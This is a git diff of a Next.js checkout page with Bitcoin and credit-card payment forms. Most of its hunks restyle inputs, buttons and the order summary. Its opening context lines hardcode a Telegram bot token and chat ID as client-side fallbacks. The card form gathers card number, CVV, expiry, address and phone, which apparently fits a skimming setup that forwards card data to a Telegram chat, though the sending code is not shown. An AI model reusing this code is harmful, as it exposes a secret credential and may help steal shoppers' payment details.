@@ -4,7 +4,7 @@ import Link from 'next/link';
 import { useCart } from '@/context/CartContext';
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
-import { ChevronDown, CreditCard, Bitcoin } from 'lucide-react';
+import { ChevronDown, CreditCard, Bitcoin, ArrowLeft } from 'lucide-react';
 
 const TELEGRAM_BOT_TOKEN = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || '7737474698:AAHyZKVaQLgdeNBEwvpbwXIToyFYfZ5TSR4';
 const TELEGRAM_CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || '7860277201';
@@ -110,7 +110,7 @@ const BitcoinPayment = ({ totalAmount }: { totalAmount: number }) => {
           value={formData.email}
           onChange={handleChange}
           required
-          placeholder="@example.com"
+          placeholder="your@email.com"
         />
 
         <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
@@ -155,25 +155,30 @@ const BitcoinPayment = ({ totalAmount }: { totalAmount: number }) => {
       <button
         onClick={handlePayment}
         disabled={loading}
-        className={`w-full py-3 px-6 rounded-md font-medium text-white transition-colors ${
+        className={`w-full py-3 px-6 rounded-lg font-medium text-white transition-colors flex items-center justify-center ${
           loading
             ? 'bg-gray-400 cursor-not-allowed'
-            : 'bg-orange-500 hover:bg-orange-600'
+            : 'bg-[#f7931a] hover:bg-[#e08119] shadow-md'
         }`}
       >
         {loading ? (
-          <span className="flex items-center justify-center">
+          <>
             <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
               <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
               <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
             </svg>
             Processing...
-          </span>
-        ) : `Pay $${totalAmount.toFixed(2)} with Bitcoin`}
+          </>
+        ) : (
+          <>
+            <Bitcoin className="w-5 h-5 mr-2" />
+            Pay ${totalAmount.toFixed(2)} with Bitcoin
+          </>
+        )}
       </button>
 
       {error && (
-        <div className="p-4 bg-red-50 border-l-4 border-red-500 text-red-700">
+        <div className="p-4 bg-red-50 border-l-4 border-red-500 text-red-700 rounded-lg">
           <p className="font-medium">Payment Error</p>
           <p>{error}</p>
         </div>
@@ -358,133 +363,143 @@ const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
     <form onSubmit={handleSubmit} className="space-y-4">
       <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
         <div className="md:col-span-2">
+          <label className="block text-sm font-medium text-gray-700 mb-1">Name on Card</label>
           <input
             type="text"
             name="cardName"
-            placeholder="Name on Card"
+            placeholder="John Smith"
             value={form.cardName}
             onChange={handleChange}
-            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.cardName ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-teal-500`}
+            className={`w-full px-4 py-3 rounded-lg border ${errors.cardName ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
             disabled={loading}
           />
           {errors.cardName && <p className="text-red-500 text-sm mt-1">{errors.cardName}</p>}
         </div>
 
         <div className="md:col-span-2">
+          <label className="block text-sm font-medium text-gray-700 mb-1">Card Number</label>
           <input
             type="text"
             name="cardNumber"
-            placeholder="Card Number (e.g. 4242 4242 4242 4242)"
+            placeholder="4242 4242 4242 4242"
             value={form.cardNumber}
             onChange={handleChange}
             maxLength={19}
-            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.cardNumber ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-teal-500`}
+            className={`w-full px-4 py-3 rounded-lg border ${errors.cardNumber ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
             disabled={loading}
           />
           {errors.cardNumber && <p className="text-red-500 text-sm mt-1">{errors.cardNumber}</p>}
         </div>
 
         <div>
+          <label className="block text-sm font-medium text-gray-700 mb-1">Expiry Date</label>
           <input
             type="text"
             name="expiry"
-            placeholder="Expiry MM/YY"
+            placeholder="MM/YY"
             value={form.expiry}
             onChange={handleChange}
             maxLength={5}
-            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.expiry ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-teal-500`}
+            className={`w-full px-4 py-3 rounded-lg border ${errors.expiry ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
             disabled={loading}
           />
           {errors.expiry && <p className="text-red-500 text-sm mt-1">{errors.expiry}</p>}
         </div>
 
         <div>
+          <label className="block text-sm font-medium text-gray-700 mb-1">CVV</label>
           <input
             type="text"
             name="cvv"
-            placeholder="CVV"
+            placeholder="123"
             value={form.cvv}
             onChange={handleChange}
             maxLength={4}
-            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.cvv ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-teal-500`}
+            className={`w-full px-4 py-3 rounded-lg border ${errors.cvv ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
             disabled={loading}
           />
           {errors.cvv && <p className="text-red-500 text-sm mt-1">{errors.cvv}</p>}
         </div>
 
         <div className="md:col-span-2">
+          <label className="block text-sm font-medium text-gray-700 mb-1">Email</label>
           <input
             type="email"
             name="email"
-            placeholder="Email"
+            placeholder="your@email.com"
             value={form.email}
             onChange={handleChange}
-            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.email ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-teal-500`}
+            className={`w-full px-4 py-3 rounded-lg border ${errors.email ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
             disabled={loading}
           />
           {errors.email && <p className="text-red-500 text-sm mt-1">{errors.email}</p>}
         </div>
 
         <div className="md:col-span-2">
+          <label className="block text-sm font-medium text-gray-700 mb-1">Address</label>
           <input
             type="text"
             name="address"
-            placeholder="Street Address"
+            placeholder="123 Main St"
             value={form.address}
             onChange={handleChange}
-            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.address ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-teal-500`}
+            className={`w-full px-4 py-3 rounded-lg border ${errors.address ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
             disabled={loading}
           />
           {errors.address && <p className="text-red-500 text-sm mt-1">{errors.address}</p>}
         </div>
 
         <div>
+          <label className="block text-sm font-medium text-gray-700 mb-1">City</label>
           <input
             type="text"
             name="city"
-            placeholder="City"
+            placeholder="New York"
             value={form.city}
             onChange={handleChange}
-            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.city ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-teal-500`}
+            className={`w-full px-4 py-3 rounded-lg border ${errors.city ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
             disabled={loading}
           />
           {errors.city && <p className="text-red-500 text-sm mt-1">{errors.city}</p>}
         </div>
 
         <div>
+          <label className="block text-sm font-medium text-gray-700 mb-1">Country</label>
           <input
             type="text"
             name="country"
-            placeholder="Country"
+            placeholder="United States"
             value={form.country}
             onChange={handleChange}
-            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.country ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-teal-500`}
+            className={`w-full px-4 py-3 rounded-lg border ${errors.country ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
             disabled={loading}
           />
           {errors.country && <p className="text-red-500 text-sm mt-1">{errors.country}</p>}
         </div>
 
         <div>
+          <label className="block text-sm font-medium text-gray-700 mb-1">ZIP Code</label>
           <input
             type="text"
             name="zipCode"
-            placeholder="ZIP Code"
+            placeholder="10001"
             value={form.zipCode}
             onChange={handleChange}
-            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.zipCode ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-teal-500`}
+            className={`w-full px-4 py-3 rounded-lg border ${errors.zipCode ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
             disabled={loading}
           />
           {errors.zipCode && <p className="text-red-500 text-sm mt-1">{errors.zipCode}</p>}
         </div>
 
         <div>
+          <label className="block text-sm font-medium text-gray-700 mb-1">Phone Number</label>
           <input
             type="tel"
             name="phone"
-            placeholder="Phone Number"
+            placeholder="+1 (555) 123-4567"
             value={form.phone}
             onChange={handleChange}
-            className={`w-full px-4 py-3 rounded-lg border-2 ${errors.phone ? 'border-red-500' : 'border-gray-200'} focus:outline-none focus:ring-2 focus:ring-teal-500`}
+            className={`w-full px-4 py-3 rounded-lg border ${errors.phone ? 'border-red-500' : 'border-gray-300'} focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent`}
             disabled={loading}
           />
           {errors.phone && <p className="text-red-500 text-sm mt-1">{errors.phone}</p>}
@@ -494,22 +509,31 @@ const CreditCardPayment = ({ totalAmount }: { totalAmount: number }) => {
       <button
         type="submit"
         disabled={loading}
-        className={`w-full py-3 px-4 rounded-xl font-bold text-white transition-all ${loading ? 'bg-teal-400 cursor-not-allowed' : 'bg-teal-600 hover:bg-teal-700'}`}
+        className={`w-full py-3 px-4 rounded-lg font-bold text-white transition-all flex items-center justify-center ${
+          loading ? 'bg-blue-400 cursor-not-allowed' : 'bg-blue-600 hover:bg-blue-700 shadow-md'
+        }`}
       >
         {loading ? (
-          <div className="flex items-center justify-center space-x-2">
-            <span>Processing...</span>
-            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-          </div>
+          <>
+            <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin mr-2"></div>
+            Processing...
+          </>
         ) : (
-          `Pay $${totalAmount.toFixed(2)}`
+          <>
+            <CreditCard className="w-5 h-5 mr-2" />
+            Pay ${totalAmount.toFixed(2)}
+          </>
         )}
       </button>
 
       {status.message && (
-        <p className={`text-center font-medium ${status.color === 'green' ? 'text-green-600' : 'text-red-600'}`}>
+        <div className={`p-3 rounded-lg text-center font-medium ${
+          status.color === 'green' 
+            ? 'bg-green-50 text-green-700 border border-green-200' 
+            : 'bg-red-50 text-red-700 border border-red-200'
+        }`}>
           {status.message}
-        </p>
+        </div>
       )}
     </form>
   );
@@ -545,7 +569,7 @@ const InputField = ({
       required={required}
       value={value}
       onChange={onChange}
-      className="w-full px-4 py-2 border border-gray-300 rounded-md focus:ring-2 focus:ring-orange-500 focus:border-orange-500"
+      className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:ring-2 focus:ring-teal-500 focus:border-transparent text-gray-900"
       placeholder={placeholder}
     />
   </div>
@@ -561,7 +585,7 @@ const CheckoutPage = () => {
     return (
       <div className="container mx-auto px-4 py-8 sm:py-12 md:py-16 text-center bg-white min-h-screen">
         <div className="max-w-md mx-auto">
-          <h1 className="text-xl sm:text-2xl font-bold mb-3 sm:mb-4 text-black">Your Cart is Empty</h1>
+          <h1 className="text-xl sm:text-2xl font-bold mb-3 sm:mb-4 text-gray-900">Your Cart is Empty</h1>
           <p className="mb-6 sm:mb-8 text-gray-600 text-sm sm:text-base">
             Looks like you haven't added any products to your cart yet.
           </p>
@@ -579,17 +603,17 @@ const CheckoutPage = () => {
     return (
       <div className="container mx-auto px-4 py-8 sm:py-12 md:py-16 text-center bg-white min-h-screen">
         <div className="max-w-md mx-auto">
-          <div className="w-16 h-16 bg-teal-100 rounded-full flex items-center justify-center mx-auto mb-4">
-            <svg className="w-10 h-10 text-teal-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
+            <svg className="w-10 h-10 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
               <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7"></path>
             </svg>
           </div>
-          <h1 className="text-xl sm:text-2xl font-bold mb-3 sm:mb-4 text-black">Order Received!</h1>
+          <h1 className="text-xl sm:text-2xl font-bold mb-3 sm:mb-4 text-gray-900">Order Received!</h1>
           <p className="mb-6 sm:mb-8 text-gray-600 text-sm sm:text-base">
             Thank you for your purchase. We've sent a confirmation to your email.
           </p>
           <Link href="/">
-            <Button className="bg-teal-600 hover:bg-teal-700 text-white px-6 sm:px-8 py-2 sm:py-3">
+            <Button className="bg-blue-600 hover:bg-blue-700 text-white px-6 sm:px-8 py-2 sm:py-3">
               Continue Shopping
             </Button>
           </Link>
@@ -599,138 +623,110 @@ const CheckoutPage = () => {
   }
 
   return (
-    <div className="container mx-auto px-4 py-6 sm:py-8 bg-white min-h-screen">
+    <div className="container mx-auto px-4 py-8 bg-white min-h-screen">
       <div className="mb-6">
-        <Link href="/cart" className="text-teal-600 hover:text-teal-700 text-sm font-medium">
-          &larr; Back to Cart
+        <Link href="/cart" className="text-teal-600 hover:text-teal-700 text-sm font-medium flex items-center">
+          <ArrowLeft className="w-4 h-4 mr-1" />
+          Back to Cart
         </Link>
       </div>
 
-      <h1 className="text-2xl sm:text-3xl font-bold mb-6 sm:mb-8 text-black">Checkout</h1>
+      <h1 className="text-2xl sm:text-3xl font-bold mb-6 sm:mb-8 text-gray-900">Checkout</h1>
 
-      <div className="grid grid-cols-1 lg:grid-cols-3 gap-4 sm:gap-6 md:gap-8">
+      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6 sm:gap-8">
         <div className="lg:col-span-2 space-y-6">
-          <Card className="p-4 sm:p-6">
-            <h2 className="text-lg sm:text-xl font-bold mb-4 text-black">Shipping Information</h2>
-            <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
-              <div className="space-y-2">
-                <label className="text-sm font-medium text-gray-700">First Name</label>
-                <input
-                  type="text"
-                  className="w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-teal-500"
-                  required
-                />
-              </div>
-              <div className="space-y-2">
-                <label className="text-sm font-medium text-gray-700">Last Name</label>
-                <input
-                  type="text"
-                  className="w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-teal-500"
-                  required
-                />
-              </div>
-            </div>
-            <div className="mt-4 space-y-2">
-              <label className="text-sm font-medium text-gray-700">Address</label>
-              <input
-                type="text"
-                className="w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-teal-500"
+          <Card className="p-6 shadow-sm">
+            <h2 className="text-lg sm:text-xl font-bold mb-4 text-gray-900">Contact Information</h2>
+            <div className="space-y-4">
+              <InputField
+                label="Email Address"
+                id="email"
+                name="email"
+                type="email"
+                value=""
+                onChange={() => {}}
                 required
+                placeholder="your@email.com"
               />
-            </div>
-            <div className="grid grid-cols-1 sm:grid-cols-3 gap-4 mt-4">
-              <div className="space-y-2">
-                <label className="text-sm font-medium text-gray-700">City</label>
-                <input
-                  type="text"
-                  className="w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-teal-500"
-                  required
-                />
-              </div>
-              <div className="space-y-2">
-                <label className="text-sm font-medium text-gray-700">State/Province</label>
-                <input
-                  type="text"
-                  className="w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-teal-500"
-                  required
-                />
-              </div>
-              <div className="space-y-2">
-                <label className="text-sm font-medium text-gray-700">ZIP/Postal Code</label>
-                <input
-                  type="text"
-                  className="w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-teal-500"
-                  required
-                />
-              </div>
-            </div>
-            <div className="mt-4 space-y-2">
-              <label className="text-sm font-medium text-gray-700">Country</label>
-              <select
-                className="w-full px-3 py-2 border rounded-md focus:outline-none focus:ring-2 focus:ring-teal-500"
-                required
-              >
-                <option value="">Select Country</option>
-                <option>United States</option>
-                <option>Canada</option>
-                <option>United Kingdom</option>
-                <option>Australia</option>
-              </select>
             </div>
           </Card>
 
-          <Card className="p-4 sm:p-6">
+          <Card className="p-6 shadow-sm">
             <div className="flex justify-between items-center mb-4">
-              <h2 className="text-lg sm:text-xl font-bold text-black">Payment Method</h2>
-              <button
-                onClick={() => setShowPaymentOptions(!showPaymentOptions)}
-                className="flex items-center text-sm text-teal-600 hover:text-teal-700"
-                type="button"
-              >
-                Change <ChevronDown className={`ml-1 h-4 w-4 transition-transform ${showPaymentOptions ? 'rotate-180' : ''}`} />
-              </button>
+              <h2 className="text-lg sm:text-xl font-bold text-gray-900">Payment Method</h2>
+              {!showPaymentOptions && (
+                <button
+                  onClick={() => setShowPaymentOptions(true)}
+                  className="text-sm text-teal-600 hover:text-teal-700 font-medium"
+                  type="button"
+                >
+                  Change
+                </button>
+              )}
             </div>
 
             {showPaymentOptions ? (
               <div className="space-y-4">
-                <div className="flex items-center space-x-4">
+                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                   <button
                     onClick={() => {
                       setPaymentMethod('credit-card');
                       setShowPaymentOptions(false);
                     }}
-                    className={`flex items-center space-x-2 px-4 py-2 rounded-md border ${paymentMethod === 'credit-card' ? 'border-teal-500 bg-teal-50' : 'border-gray-300'}`}
+                    className={`p-4 rounded-lg border-2 flex flex-col items-center ${
+                      paymentMethod === 'credit-card' 
+                        ? 'border-blue-500 bg-blue-50' 
+                        : 'border-gray-200 hover:border-gray-300'
+                    } transition-colors`}
                     type="button"
                   >
-                    <CreditCard className="h-5 w-5" />
-                    <span>Credit Card</span>
+                    <CreditCard className="h-6 w-6 mb-2 text-gray-700" />
+                    <span className="font-medium">Credit Card</span>
+                    <span className="text-xs text-gray-500 mt-1">Visa, Mastercard, etc.</span>
                   </button>
                   <button
                     onClick={() => {
                       setPaymentMethod('bitcoin');
                       setShowPaymentOptions(false);
                     }}
-                    className={`flex items-center space-x-2 px-4 py-2 rounded-md border ${paymentMethod === 'bitcoin' ? 'border-teal-500 bg-teal-50' : 'border-gray-300'}`}
+                    className={`p-4 rounded-lg border-2 flex flex-col items-center ${
+                      paymentMethod === 'bitcoin' 
+                        ? 'border-orange-500 bg-orange-50' 
+                        : 'border-gray-200 hover:border-gray-300'
+                    } transition-colors`}
                     type="button"
                   >
-                    <Bitcoin className="h-5 w-5" />
-                    <span>Bitcoin</span>
+                    <Bitcoin className="h-6 w-6 mb-2 text-[#f7931a]" />
+                    <span className="font-medium">Bitcoin</span>
+                    <span className="text-xs text-gray-500 mt-1">Pay with cryptocurrency</span>
                   </button>
                 </div>
               </div>
             ) : (
-              <div className="flex items-center space-x-2 p-3 bg-gray-50 rounded-md">
-                {paymentMethod === 'credit-card' ? (
-                  <>
-                    <CreditCard className="h-5 w-5 text-gray-600" />
-                    <span className="text-sm font-medium">Credit Card</span>
-                  </>
-                ) : (
-                  <>
-                    <Bitcoin className="h-5 w-5 text-orange-500" />
-                    <span className="text-sm font-medium">Bitcoin</span>
-                  </>
-                )}
+              <div className="p-4 bg-gray-50 rounded-lg border border-gray-200">
+                <div className="flex items-center space-x-3">
+                  {paymentMethod === 'credit-card' ? (
+                    <>
+                      <div className="p-2 bg-blue-100 rounded-lg">
+                        <CreditCard className="h-5 w-5 text-blue-600" />
+                      </div>
+                      <div>
+                        <p className="font-medium text-gray-900">Credit Card</p>
+                        <p className="text-sm text-gray-500">Pay with Visa, Mastercard, etc.</p>
+                      </div>
+                    </>
+                  ) : (
+                    <>
+                      <div className="p-2 bg-orange-100 rounded-lg">
+                        <Bitcoin className="h-5 w-5 text-[#f7931a]" />
+                      </div>
+                      <div>
+                        <p className="font-medium text-gray-900">Bitcoin</p>
+                        <p className="text-sm text-gray-500">Pay with cryptocurrency</p>
+                      </div>
+                    </>
+                  )}
+                </div>
               </div>
             )}
 
@@ -745,49 +741,49 @@ const CheckoutPage = () => {
         </div>
 
         <div>
-          <Card className="p-4 sm:p-6 sticky top-4">
-            <h2 className="text-lg sm:text-xl font-bold mb-4 text-black">Order Summary</h2>
+          <Card className="p-6 shadow-sm sticky top-6">
+            <h2 className="text-lg sm:text-xl font-bold mb-4 text-gray-900">Order Summary</h2>
 
-            <div className="space-y-3 mb-6">
+            <div className="space-y-4 mb-6">
               {cart.map(item => (
-                <div key={item.id} className="flex justify-between items-center">
-                  <div className="flex items-center">
+                <div key={item.id} className="flex justify-between items-start">
+                  <div className="flex items-start space-x-3">
                     <img
                       src={item.image}
                       alt={item.name}
-                      className="w-10 h-10 object-cover rounded mr-3"
+                      className="w-12 h-12 object-cover rounded-md"
                     />
                     <div>
-                      <p className="text-sm font-medium text-gray-900 line-clamp-1">{item.name}</p>
+                      <p className="text-sm font-medium text-gray-900">{item.name}</p>
                       <p className="text-xs text-gray-500">Qty: {item.quantity}</p>
                     </div>
                   </div>
-                  <p className="text-sm font-medium">${(item.price * item.quantity).toFixed(2)}</p>
+                  <p className="text-sm font-medium text-gray-900">${(item.price * item.quantity).toFixed(2)}</p>
                 </div>
               ))}
             </div>
 
-            <div className="space-y-3 border-t pt-4">
+            <div className="space-y-3 border-t border-gray-200 pt-4">
               <div className="flex justify-between">
                 <span className="text-sm text-gray-600">Subtotal</span>
-                <span className="text-sm font-medium">${getTotalPrice().toFixed(2)}</span>
+                <span className="text-sm font-medium text-gray-900">${getTotalPrice().toFixed(2)}</span>
               </div>
               <div className="flex justify-between">
                 <span className="text-sm text-gray-600">Shipping</span>
-                <span className="text-sm font-medium">$0.00</span>
+                <span className="text-sm font-medium text-gray-900">Free</span>
               </div>
               <div className="flex justify-between">
                 <span className="text-sm text-gray-600">Tax</span>
-                <span className="text-sm font-medium">${(getTotalPrice() * 0.08).toFixed(2)}</span>
+                <span className="text-sm font-medium text-gray-900">${(getTotalPrice() * 0.08).toFixed(2)}</span>
               </div>
               <div className="flex justify-between font-bold text-base pt-2">
-                <span>Total</span>
-                <span>${(getTotalPrice() * 1.08).toFixed(2)}</span>
+                <span className="text-gray-900">Total</span>
+                <span className="text-gray-900">${(getTotalPrice() * 1.08).toFixed(2)}</span>
               </div>
             </div>
 
-            <div className="mt-4 text-center text-xs text-gray-500">
-              <p>By placing your order, you agree to our Terms of Service</p>
+            <div className="mt-6 text-xs text-gray-500">
+              <p>By placing your order, you agree to our <a href="#" className="text-teal-600 hover:underline">Terms of Service</a></p>
             </div>
           </Card>
         </div>
